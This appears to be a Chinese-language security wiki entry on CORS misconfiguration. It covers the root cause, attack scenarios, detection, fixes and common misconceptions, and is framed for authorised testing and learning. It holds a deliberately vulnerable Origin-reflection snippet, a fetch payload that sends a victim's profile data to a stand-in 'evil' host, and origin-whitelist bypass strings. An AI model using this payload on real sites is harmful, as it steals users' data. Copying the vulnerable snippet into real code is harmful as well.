---
id: cors
title: CORS 配置错误（CORS Misconfiguration）
category: 前端与跨站类
severity: medium
owasp: A05:2021-Security Misconfiguration
cwe: CWE-942
tags: [cors, frontend, misconfiguration]
---

> 本条目仅用于授权安全测试与防御学习。请勿对未授权目标使用文中技术。

# CORS 配置错误（CORS Misconfiguration）

## 一句话
> CORS 是同源策略的官方「开洞」机制——配置错误等于把「跨域读取用户数据」的口子开给了攻击者的网站。

## 它是怎么发生的
**根因**：浏览器默认禁止脚本读取跨源响应；服务器用响应头 `Access-Control-Allow-Origin`（ACAO）声明「允许谁读」。问题出在服务端把「允许谁」写成了动态逻辑：

```python
# 危险：反射请求中的 Origin
resp["Access-Control-Allow-Origin"] = request.headers["Origin"]
resp["Access-Control-Allow-Credentials"] = "true"
```

任何网站都能让受害者浏览器带着 Cookie 请求该接口，并**读到**响应——SOP 的保护被服务端亲手交回给任意 Origin。

**机制速览**：
- **简单请求**（GET/POST + 安全头）：直接发出，浏览器凭响应头决定是否让脚本读。
- **预检请求**（带自定义头/PUT/DELETE 等）：先发 `OPTIONS`，凭 `Access-Control-Allow-Methods`/`-Headers` 决定是否放行真请求。
- **凭据模式**：JS 用 `fetch(..., {credentials: 'include'})` 带 Cookie，此时 ACAO 不能为 `*`，必须精确 Origin——「反射 Origin + credentials:true」正是最危险的组合。

## 攻击场景

### 场景一：Origin 反射 + 凭据（经典）
**目标**：个人中心 API 返回敏感数据。**思路**：攻击页面对受害者浏览器发起带凭据的跨域请求，读响应。
**payload**：攻击者页面 `fetch("https://target.com/api/profile", {credentials:"include"}).then(r=>r.text()).then(t=>fetch("https://evil/"+t))`
**结果**：Origin: https://evil.com 被反射 + ACAC: true → 响应可读，受害者数据外传。

### 场景二：Origin 前缀/后缀校验绕过
**目标**：白名单用 `startsWith("https://target.com")`。**思路**：注册 `https://target.com.evil.com`。
**payload**：Origin: `https://target.com.evil.com`
**结果**：校验通过、反射生效。后缀同理（`evil-target.com` 不行但 `.target.com.evil.com` 类子域逻辑可能中招）。

### 场景三：信任 null Origin
**目标**：ACAO 配置包含 `null`。**思路**：`<iframe sandbox>` 中发起的请求 Origin 为 null。
**结果**：任何页面用 sandbox iframe 即可满足条件。

### 场景四：XSS 联动升级
**目标**：子域存在 [XSS](xss.md)。**思路**：CORS 白名单包含 `*.target.com`。
**结果**：子域 XSS 借 CORS 读任意跨子域敏感接口——CORS 白名单的每一项都是信任决策。

## 怎么发现它
- **手工测试**：对 API 请求**改 Origin 头**为自控域、`null`、子域变体、目标域前后缀拼接，逐一观察响应中 ACAO 是否变化、是否出现 `Access-Control-Allow-Credentials: true`。
- **工具**：Burp 的 CORS 检查项 / 自写脚本批量改 Origin。
- **真假判断**：ACAO: `*` 且无 ACAC = 不可利用（不带凭据，读到的是公开数据）；「反射 + ACAC true」= 高危；仅 `Allow-Methods` 宽松而无 ACAO 回显 = 无实际读取能力。**确认「攻击者 Origin + 凭据 + 可读」三件套才成立**。

## 常见绕过与进阶
- **白名单用子串匹配**：`"target.com" in origin` → `https://target.com.evil.com` 命中。
- **正则未转义点**：`target.com` 写成未转义正则 → `targetXcom` 类域名命中。
- **多值头**：代理层叠加 ACAO 时浏览器行为各异（罕见但存在）。
- 思路主线：**CORS 配置漏洞的检验对象是「Origin 校验逻辑」，不是「有没有 CORS 头」**。

## 怎么修
1. **Origin 严格白名单**：精确匹配（全等比较），绝不反射、不做子串/未转义正则匹配。
2. **凭据与 `*` 互斥**：需要凭据的接口逐域配置；公开数据接口用 `*` 且不配 ACAC。
3. **按接口区分策略**：敏感接口不加宽松 CORS——「全局中间件统一加 CORS」是最常见的出错形态。
4. **收紧白名单内容**：白名单里的每个子域都是信任边界，能用主域就不用通配子域。

## 常见误区
- **「有 CORS 头就不安全 / 没有 CORS 头就安全」**：CORS 是放行机制，默认（无头）才是全禁；安全取决于放行的对象与凭据组合。
- **「ACAO: * 是高危」**：不带凭据的 `*` 只允许读公开数据，属于合理配置；危险的永远是「可控 Origin + 凭据」。
- **「CORS 和 CSRF 是一回事」**：CORS 决定「攻击者能否**读**跨域响应」，CSRF 是「能否**发**请求」——CSRF 不需要 CORS 放行，CORS 错误则让攻击从「盲发」升级为「可读」。

## 关联
- 前置：[HTTP 基础](../00-basics/http-basics.md)（同源策略）
- 相关：[CSRF](csrf.md)（一对姊妹：一个管读、一个管写） · [XSS](xss.md)（子域 XSS 可借白名单放大）
- 参考：[MDN CORS](https://developer.mozilla.org/zh-CN/docs/Web/HTTP/CORS) · [PortSwigger: CORS](https://portswigger.net/web-security/cors)
